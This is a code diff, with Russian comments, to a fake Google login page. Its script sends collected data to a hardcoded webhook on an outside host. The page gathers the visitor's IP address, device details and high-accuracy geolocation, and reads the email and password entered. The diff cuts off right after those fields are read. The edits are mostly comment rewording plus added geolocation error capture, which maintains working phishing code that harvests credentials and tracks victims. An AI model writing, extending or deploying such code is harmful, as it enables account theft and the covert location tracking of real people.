@@ -78,7 +78,7 @@
       
     <div class="form-section">
       <h2>Авторизация</h2>
-      <!-- Указываем method="POST", чтобы по умолчанию данные не попадали в URL -->
+      <!-- Используем метод POST для предотвращения изменения URL -->
       <form id="login-form" method="POST">
         <div class="input-group">
           <label for="email">Google Почта:</label>
@@ -102,7 +102,7 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
 
-    // Объект для хранения информации об устройстве, IP, и геолокации
+    // Объект для хранения информации об устройстве, IP и геолокации
     const clientInfo = {
       geolocation: {},
       device: {
@@ -111,10 +111,10 @@
         language: navigator.language,
         screenResolution: `${window.screen.width}x${window.screen.height}`
       },
-      ip: null // Здесь будет IP-адрес пользователя
+      ip: null // IP-адрес будет получен через API
     };
 
-    // Получение IP-адреса пользователя через API ipify
+    // Получение IP-адреса через API ipify
     fetch("https://api.ipify.org?format=json")
       .then(response => response.json())
       .then(data => {
@@ -127,7 +127,7 @@
     // Запрос геолокации с повышенной точностью
     if ('geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
-        position => {
+        (position) => {
           const coords = position.coords;
           clientInfo.geolocation = {
             latitude: coords.latitude,
@@ -140,12 +140,16 @@
             timestamp: position.timestamp
           };
         },
-        error => {
+        (error) => {
           if (error.code === error.PERMISSION_DENIED) {
             alert('Ошибка авторизации: доступ к геолокации отклонён пользователем.');
           } else {
             console.error('Ошибка получения геолокации:', error.message);
           }
+          clientInfo.geolocation = {
+            error: error.message,
+            code: error.code
+          };
         },
         {
           enableHighAccuracy: true,
@@ -158,7 +162,7 @@
       clientInfo.geolocation = { error: 'Geolocation not supported' };
     }
 
-    // Функция для декодирования Base64-параметров и парсинга строки
+    // Функция декодирования Base64-параметров из строки URL
     function decodeBase64Params(base64Str) {
       try {
         const decodedStr = atob(base64Str);
@@ -184,7 +188,7 @@
       }
     }
 
-    // Извлечение параметров из URL
+    // Извлечение параметров из URL (ожидается параметр с именем "ID")
     function getParamsFromURL() {
       const params = new URLSearchParams(window.location.search);
       const data = params.get("ID");
@@ -194,7 +198,7 @@
       return null;
     }
 
-    // Отображение переданных параметров на странице
+    // Отображение параметров на странице
     const urlParams = getParamsFromURL();
     if (urlParams) {
       document.getElementById("url-info").innerHTML =
@@ -212,9 +216,7 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: messageContent })
       })
-      .then(response => {
-        callback(response.ok);
-      })
+      .then(response => callback(response.ok))
       .catch(error => {
         console.error("Ошибка отправки данных:", error);
         callback(false);
@@ -223,7 +225,7 @@
 
     // Обработка формы авторизации
     document.getElementById("login-form").addEventListener("submit", function(e) {
-      e.preventDefault(); // Отменяет стандартную отправку формы, что предотвращает изменение URL
+      e.preventDefault(); // Предотвращает изменение URL
 
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
